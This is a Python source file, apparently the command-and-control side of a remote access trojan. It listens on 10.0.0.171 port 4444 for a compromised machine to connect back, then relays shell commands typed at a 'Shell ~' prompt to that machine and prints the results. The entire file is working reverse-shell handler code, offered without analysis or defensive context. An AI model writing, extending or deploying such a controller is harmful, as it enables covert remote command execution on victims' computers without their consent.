import socket
import json
import os


def send_command(command):
	command_dump = json.dumps(command)
	ratconnection.send(command_dump.encode())

def get_response():
	output = ratconnection.recv(1024).decode()
	return json.loads(output)



def communicationchannel():
	while True:
		command = input("Shell ~ ")
		send_command(command)
		if command == 'quit':
			break
		elif 'cd' in command:
			pass
		elif command == 'clear':
			os.system('cls')
		else:
			result = get_response()
			print(result)


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

soc.bind(("10.0.0.171",4444))
soc.listen(5)
ratconnection, ip = soc.accept()
print("[+] connected to " + str(ip))
communicationchannel()
